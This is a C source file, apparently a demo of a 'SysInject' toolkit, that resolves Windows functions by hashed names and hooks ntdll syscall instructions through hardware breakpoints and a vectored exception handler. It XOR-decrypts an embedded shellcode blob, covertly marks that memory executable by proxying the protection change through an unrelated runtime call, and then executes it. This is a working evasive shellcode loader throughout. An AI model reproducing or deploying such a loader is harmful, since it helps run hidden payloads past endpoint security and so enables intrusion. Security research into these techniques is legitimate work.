#include "Shellcode-Toolkit.h"
#include "SysInjectBreakpoint.h"

// Function types
typedef void *(*Type_LoadLibraryA)(const char *lpLibFileName);
typedef void  (*Type_Sleep)(unsigned long dwMilliseconds);
typedef void  (*Type__resetstkoflw)(void);
typedef int   (*Type_printf)(const char *, ...);
typedef void *(*Type_RtlAddVectoredExceptionHandler)(unsigned long First, void *Handler);
typedef unsigned long (*Type_RtlRemoveVectoredExceptionHandler)(void *Handle);

// Find a syscall instruction in a target syscall stub based on the search distance
static void *GetSyscallInstruction(void *Export_Address, int Max_Search_Distance)
{
	unsigned char *Address = (unsigned char *)Export_Address;
	for (unsigned int Index = 0; Index < Max_Search_Distance; ++Index)
	{
		// Check if it is a syscall instruction (0F05)
		if (Address[Index] == 0x0F && Address[Index+1] == 0x05)
		{
			void *Syscall_Instruction = (Address + Index);
			return Syscall_Instruction;
		}
	}
	// Return 0 if nothing found
	return 0;
}

// The encrypted shellcode
unsigned char Shellcode[] = { 0x15,0xc2,0xb0,0x6d,0xec,0xa0,0xe8,0xee,0x78,0x21,0x5c,0x45,0x89,0xa0,0xe8,0xaa,0x45,0x0d,0xd1,0x0d,0xa9,0xa0,0xe8,0xaa,0x7d,0x08,0x65,0x84,0xfd,0xdb,0x2f,0x61,0x1d,0x11,0xe6,0x2a,0xad,0xe8,0x63,0x8c,0x1c,0xca,0x54,0x23,0x0c,0x21,0x17,0xe4,0x36,0x93,0x79,0x4a,0x3f,0x21,0x2a,0x69,0x9d,0x43,0x5d,0x8f,0x62,0x01,0xe2,0x10,0x0e,0xc3,0xcd,0x33,0xfc,0xee,0x2b,0x61,0x15,0x61,0xb7,0x42,0xc1,0x63,0x63,0x01,0x95,0x70,0x95,0xff,0x88,0xc7,0xf9,0xf9,0xb5,0x72,0x5c,0x45,0x89,0xa0,0xee,0xe7,0x86,0x41,0x5c,0x45,0x76,0x38,0xd9,0xfc,0x3e,0xb1,0x81,0x0d,0x00,0x29,0x8b,0xf7,0x5d,0x41,0x5c,0x00,0xb8,0x21,0x52,0x23,0x11,0xcc,0x59,0xf4,0x89,0xe8,0x63,0xa2,0xd0,0x54,0xc6,0x45,0x89,0xe8,0x9c,0x3a,0x6c,0x81,0x14,0xc6,0x4d,0xc0,0xa0,0x7a,0x0b,0x00,0xd5,0x96,0xc1,0x61,0xab,0xb9,0xd6,0x10,0x60,0x0d,0x04,0xbc,0x72,0xf2,0x3b,0xc0,0x66,0x4e,0x8b,0x9d,0x66,0x61,0x0f,0x31,0xb7,0x46,0x02,0xba,0x03,0xa2,0x5c,0x83,0x6d,0x8c,0x02,0xb2,0x7b,0x61,0x2f,0x61,0x65,0x9c,0xfd,0xb3,0x27,0x67,0x59,0xcc,0x5c,0x45,0x89,0xe8,0x2a,0xeb,0x9d,0x04,0xd7,0x49,0xb9,0xa9,0xdb,0x85,0x79,0x41,0x5c,0x0c,0x88,0x29,0x26,0xe5,0xeb,0x50,0x19,0xc1,0x5b,0x9c,0x6f,0xaf,0x36,0x81,0x79,0x0c,0x76,0x29,0x26,0xeb,0x8d,0xaa,0xb7,0x00,0xb0,0x2b,0x16,0xcf,0x19,0xca,0x1e,0x61,0x88,0x21,0x2a,0xeb,0x9d,0x00,0x53,0xf2,0x85,0xe0,0x27,0x61,0x1f,0x5d,0x9d,0xa4,0x8b,0xa0,0x00,0x23,0x15,0xcc,0x48,0x4d,0xcb,0x63,0x77,0xe8,0x15,0x40,0x8c,0xae,0x8f,0x17,0xa2,0x01,0xfc,0x70,0x9c,0x1e,0xd7,0x2b,0xf3,0x7a,0x15,0x24,0x30,0x29,0xe6,0xc4,0x43,0x9d,0x32,0x33,0x30,0x21,0xa8,0xe8,0x63,0xea,0x0e,0x29,0x39,0x29,0xe5,0x8b,0x0c,0x8e,0x38,0x61,0x08,0x20,0xfa,0x9c,0x63,0xbf,0x0e,0x04,0x0e,0x76,0xbb,0xe8,0x63,0xea,0x5d,0x41,0x5c,0x45,0x89,0xe8,0x63,0xea };

// Key to decrypt the shellcode
unsigned char XOR_Key[] = { 0x5d,0x41,0x5c,0x45,0x89,0xe8,0x63,0xea };

int main()
{
	void *Address_PEB      = GetPEBAddress();
	void *Address_KERNEL32 = GetModuleAddress(Address_PEB, 0x76918253); // "KERNEL32.DLL"
	void *Address_NTDLL    = GetModuleAddress(Address_PEB, 0x5602B4CB); // "ntdll.dll"
	if (!Address_KERNEL32 || !Address_NTDLL)
	{
		return 1;
	}

	// Set global functions required for SysInject
	GetThreadContext = GetExportAddress(Address_KERNEL32, 0x3AEE53B8);
	NtContinue       = GetExportAddress(Address_NTDLL,    0x77FF45AA);

	Type_RtlAddVectoredExceptionHandler RtlAddVectoredExceptionHandler = (Type_RtlAddVectoredExceptionHandler)GetExportAddress(Address_NTDLL, 0x1B2FA9AB); // "RtlAddVectoredExceptionHandler"
	Type_RtlRemoveVectoredExceptionHandler RtlRemoveVectoredExceptionHandler = (Type_RtlRemoveVectoredExceptionHandler)GetExportAddress(Address_NTDLL, 0xD06F0B68); // "RtlRemoveVectoredExceptionHandler"
	Type_LoadLibraryA LoadLibraryA = (Type_LoadLibraryA)GetExportAddress(Address_KERNEL32, 0x139A2F01); // "LoadLibraryA"
	Type_Sleep Sleep = (Type_Sleep)GetExportAddress(Address_KERNEL32, 0xA02AD0E0); // "Sleep"

	// Load MSVCRT so we can get printf and _resetstkoflw
	void *Address_MSVCRT = LoadLibraryA("MSVCRT");

	Type_printf printf = (Type_printf)GetExportAddress(Address_MSVCRT, 0x9EBC18B6); // "printf"
	Type__resetstkoflw _resetstkoflw = (Type__resetstkoflw)GetExportAddress(Address_MSVCRT, 0x90177B7F); // "_resetstkoflw"

	// Find target syscall stubs from ntdll.dll
	void *Address_NtProtectVirtualMemory  = GetExportAddress(Address_NTDLL, 0xFBCC248A);
	void *Address_NtDelayExecution        = GetExportAddress(Address_NTDLL, 0xD8788BE0);
	if (!Address_NtProtectVirtualMemory || !Address_NtDelayExecution)
	{
		printf("ERROR: an NTDLL function was not located correctly\n");
		return 1;
	}

	// Find target syscall instructions, syscall stubs are 32 bytes long, do not get one from another stub
	void *SysAddress_NtProtectVirtualMemory = GetSyscallInstruction(Address_NtProtectVirtualMemory, 32);
	void *SysAddress_NtDelayExecution       = GetSyscallInstruction(Address_NtDelayExecution, 32);
	if (!SysAddress_NtProtectVirtualMemory || !SysAddress_NtDelayExecution)
	{
		printf("ERROR: a syscall instruction was not located correctly\n");
		return 1;
	}

	// We will be using the Hardware Breakpoints method, so install the SysInject handler for Hardware Breakpoints
	void *SysInject_Handler = RtlAddVectoredExceptionHandler(1, SyscallHandler);

	// Test syscall ghost feature by calling Sleep(INFINITE), ghost mode is 1
	void *Ghost_Delay = SysInject(1, SysAddress_NtDelayExecution, 0, 0);
	printf("Installed ghost on NtDelayExecution's syscall instruction to skip every sleep!\n");
	printf("Calling Sleep(INFINITE)\n");
	Sleep(4294967295);
	SysUninject(Ghost_Delay);
	printf("Removed ghost on NtDelayExecution\n\n");

    unsigned long long Shellcode_Size = sizeof(Shellcode);
	void *Base_Address = (void*)Shellcode;
	// Decrypt shellcode and overwrite the RW encrypted shellcode using it
    for (int Index = 0; Index < Shellcode_Size; ++Index)
    {
        Shellcode[Index] = Shellcode[Index] ^ XOR_Key[Index % (sizeof XOR_Key)];
    }
	printf("Decrypted shellcode written at %p\n\n", Base_Address);

	// Inject custom parameters to the NtProtectVirtualMemory syscall instruction, inject mode is 0
	// Then proxy call it using a random function which internally calls VirtualProtect
	unsigned long Old_Protect = 0;
	void *Breakpoint_Protect = SysInject(0, SysAddress_NtProtectVirtualMemory, 5, (void*[]){(void*)-1, &Base_Address, &Shellcode_Size, (void*)0x20, &Old_Protect});
	printf("Installed injector on NtProtectVirtualMemory's syscall instruction to change shellcode protection to RX\n");
	printf("Proxy calling VirtualProtect using _resetstkoflw()!\n\n");
	_resetstkoflw();

	// Inject custom parameters to the NtDelayExecution syscall instruction
	unsigned long long Delay = -50000000;
	void *Breakpoint_Delay = SysInject(0, SysAddress_NtDelayExecution, 2, (void*[]){0, &Delay});
	printf("Installed injector on NtDelayExecution's syscall instruction to make all delays 5 seconds!\n");
	printf("Calling Sleep(0)\n\n");
	Sleep(0);

	// Uninstall both of the injectors
	SysUninject(Breakpoint_Protect);
	printf("Removed injector on NtProtectVirtualMemory\n");
	SysUninject(Breakpoint_Delay);
	printf("Removed injector on NtDelayExecution\n\n");

	// Remove the SysInject exception handler
	RtlRemoveVectoredExceptionHandler(SysInject_Handler);

	printf("Executing the shellcode!\n");
	((void(*)())Shellcode)();
}
